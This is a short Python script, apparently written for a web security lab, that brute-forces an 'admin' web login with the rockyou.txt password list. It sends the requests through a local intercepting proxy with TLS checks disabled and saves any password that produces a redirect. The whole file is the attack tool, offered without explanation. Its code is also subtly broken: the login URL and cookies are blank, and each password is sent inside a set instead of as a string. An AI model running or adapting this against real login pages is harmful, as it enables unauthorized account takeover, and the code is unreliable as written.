import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}


def bruteforce_passwords():
    
    print("[+] Brute forcing the admin password...")

    with open('rockyou.txt', 'r') as passwords:
        for pwd in passwords:
            password = pwd.strip()
            login_url = ""
            cookies = {}
            r = requests.Session()
            login_data = {"username":"admin", "password": {password}}
            req = r.post(login_url, data = login_data, cookies = cookies, verify = False)

            if req.status_code == 302:
                print(f"[+] Found admin password: {password} .")
                with open ('password.txt', 'w') as g:
                    g.write(password)
                sys.exit(0)
        
        print("[-] Could not find admin password.")

    
def main():
    bruteforce_passwords()

if __name__ == "__main__":
    main()